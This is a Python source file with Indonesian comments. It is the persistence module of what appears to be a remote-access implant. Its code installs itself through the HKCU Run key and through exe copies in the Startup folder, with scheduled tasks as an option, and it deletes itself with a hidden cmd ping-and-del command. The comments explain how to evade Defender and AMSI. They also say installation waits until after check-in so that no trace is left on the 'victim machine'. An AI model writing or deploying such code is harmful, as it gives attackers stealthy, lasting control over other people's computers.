"""core/persist.py — persistensi tanpa admin, versi rendah-jejak.

Yang dipakai:
  1. HKCU Run              -> jalur paling umum, dipakai app normal,
                              nggak lewat script host, nggak ada file
                              tambahan yang perlu ditulis ke disk
  2. Salinan exe di Startup -> jalur kedua kalau Run key dikunci policy

Yang DIBUANG dari versi lama dan kenapa:

  .vbs di Startup -> wscript.exe + isi file di-scan AMSI setiap logon.
                     Dua-duanya jalur yang dipantau Defender. Nggak ada
                     untungnya dibanding salinan exe biasa yang nggak
                     lewat script host sama sekali.

  schtasks        -> yang bikin task butuh spawn proses baru, dan di mesin
                     berpolicy ketat /create tetap ditolak tanpa elevate.
                     Biaya perilaku, nol hasil. Sekarang opt-in lewat
                     config.TASK.

Yang TIDAK dipakai karena butuh admin: service, HKLM, WMI subscription,
print monitor, netsh helper, IFEO.
"""

import os
import sys
import winreg

RUN_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
STARTUP = os.path.join(os.getenv("APPDATA") or "", "Microsoft", "Windows",
                       "Start Menu", "Programs", "Startup")


def install_dir(name):
    base = os.getenv("LOCALAPPDATA") or os.path.expanduser("~")
    return os.path.join(base, "Programs", name)


def target_path(name):
    return os.path.join(install_dir(name), name + ".exe")


def _parent_image(pid):
    """Path image dari proses induk, lewat handle. Ground truth, bukan sys.executable."""
    import ctypes
    k32 = ctypes.WinDLL("kernel32", use_last_error=True)
    PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
    k32.OpenProcess.restype = ctypes.c_void_p
    handle = k32.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, False, pid)
    if not handle:
        return None
    try:
        buf = ctypes.create_unicode_buffer(32768)
        size = ctypes.c_ulong(32768)
        if k32.QueryFullProcessImageNameW(ctypes.c_void_p(handle), 0, buf,
                                           ctypes.byref(size)):
            return buf.value or None
        return None
    finally:
        k32.CloseHandle(ctypes.c_void_p(handle))


def _is_self_contained(exe):
    """False kalau exe butuh DLL Python di sebelahnya (folder ekstraksi)."""
    folder = os.path.dirname(os.path.abspath(exe))
    try:
        names = os.listdir(folder)
    except OSError:
        return True
    for name in names:
        low = name.lower()
        if low.startswith("python3") and low.endswith(".dll"):
            return False
    return True


def self_path():
    """Exe utuh yang aman dipindah, atau None kalau jalan sebagai script.

    Kenapa bukan sys.executable saja: di Nuitka onefile, proses anak jalan
    dari folder ekstraksi (%LOCALAPPDATA%\\msoia\\...), dan exe di situ cuma
    cangkang yang butuh python313.dll + libssl di sebelahnya. Menyalin exe
    itu sendirian menghasilkan install yang nggak bisa jalan.

    Bootstrap onefile men-set NUITKA_ONEFILE_PARENT ke PID proses induk —
    itulah binary onefile aslinya, satu file, bisa dipindah.
    """
    pid = os.environ.get("NUITKA_ONEFILE_PARENT")
    if pid and pid.isdigit():
        try:
            parent = _parent_image(int(pid))
        except Exception:
            parent = None
        if parent and os.path.isfile(parent):
            return parent

    if getattr(sys, "frozen", False):
        return sys.executable

    main = sys.modules.get("__main__")
    if main is not None and getattr(main, "__compiled__", None) is not None:
        exe = sys.executable
    else:
        if os.path.basename(sys.executable).lower().startswith("python"):
            return None
        exe = sys.executable

    # Standalone / folder: exe nggak boleh dipisah dari DLL-nya.
    if not _is_self_contained(exe):
        return exe  # tetap dipakai untuk Run key, tapi install() nggak nyalin
    return exe


# ---------------------------------------------------------------- startup

def startup_path(name):
    return os.path.join(STARTUP, name + ".exe")


def add_startup(name, exe):
    """Startup folder: salinan exe, bukan .vbs dan bukan .lnk.

    Kenapa salinan polos:
      .vbs  -> wscript.exe + isi file di-scan AMSI tiap logon.
      .lnk  -> harus bawa ItemIDList kalau mau benar-benar resolve; yang
                cuma LinkInfo kebaca tapi TargetPath kosong, alias rusak.
      .exe  -> nggak lewat script host, nggak ada format biner yang bisa
                salah tulis, dan yang dibaca sama-sama kelihatan di folder.
    """
    try:
        os.makedirs(STARTUP, exist_ok=True)
        dest = startup_path(name)
        with open(exe, "rb") as fh:
            blob = fh.read()
        with open(dest, "wb") as fh:
            fh.write(blob)
        return True
    except OSError:
        return False


def del_startup(name):
    for ext in (".exe", ".lnk", ".vbs"):
        try:
            os.remove(startup_path(name)[:-4] + ext)
        except OSError:
            pass
    return True


# ------------------------------------------------------------------- autorun

def add_run(name, exe):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY, 0,
                             winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, '"%s"' % exe)
        winreg.CloseKey(key)
        return True
    except OSError:
        return False


def add_task(name, exe):
    """Opt-in. Gagal di mesin ini tanpa elevate, jadi default-nya mati."""
    import subprocess
    try:
        p = subprocess.run(
            ["schtasks", "/create", "/tn", name, "/tr", '"%s"' % exe,
             "/sc", "onlogon", "/rl", "LIMITED", "/f"],
            capture_output=True, timeout=30,
            creationflags=0x08000000)  # CREATE_NO_WINDOW
        return p.returncode == 0
    except Exception:
        return False


def install(name, task=False):
    """Copy diri ke %LOCALAPPDATA%\\Programs\\<name>, pasang autorun.

    Return path yang dipasang, atau string "gagal: ..." kalau ada yang salah.
    Sengaja TIDAK diam: versi pertama fungsi ini menelan semua error, dan
    akibatnya persistensi gagal tanpa satu pun petunjuk di channel.

    Dipanggil SETELAH check-in pertama berhasil, bukan sebelum. Kalau token
    salah atau jaringan mati, nggak ada sampah yang tertinggal di mesin korban.
    """
    src = self_path()
    if src is None:
        return "gagal: self_path() kosong"

    exe = target_path(name)
    launch = src
    contained = _is_self_contained(src)

    if contained:
        try:
            if os.path.abspath(src) != os.path.abspath(exe):
                os.makedirs(install_dir(name), exist_ok=True)
                same = (os.path.isfile(exe)
                        and os.path.getsize(exe) == os.path.getsize(src))
                if not same:
                    with open(src, "rb") as fh:
                        blob = fh.read()
                    with open(exe, "wb") as fh:
                        fh.write(blob)
            launch = exe
        except OSError as exc:
            return "copy gagal: %s" % exc

    run_ok = add_run(name, launch)
    # Satu metode saja, bukan tiga sekaligus. Menulis salinan exe ke
    # Startup FOLDER tepat beberapa detik setelah menulis nilai Run adalah
    # pola "persistensi ganda" yang jadi fitur utama ML Defender. Kalau Run
    # key berhasil, itu cukup; Startup cuma jaring kalau Run diblokir policy.
    if run_ok:
        up_ok = "skip"
    else:
        up_ok = add_startup(name, launch) if contained else "skip"
    task_ok = add_task(name, launch) if task else None

    return "ok run=%s startup=%s task=%s -> %s" % (run_ok, up_ok, task_ok, launch)


def remove(name):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY, 0,
                             winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, name)
        winreg.CloseKey(key)
    except OSError:
        pass
    del_startup(name)
    return "dicabut"


def purge(name):
    """Hapus total: autorun, shortcut, folder. Exe diri dihapus setelah mati."""
    import subprocess
    remove(name)
    here = self_path()
    exe = target_path(name)
    if here and os.path.abspath(here) == os.path.abspath(exe):
        subprocess.Popen('cmd /c ping -n 4 127.0.0.1 >nul & del /f /q "%s"' % exe,
                         shell=True, creationflags=0x08000000)
        return "bye"
    import shutil
    shutil.rmtree(install_dir(name), ignore_errors=True)
    return "dibersihkan"
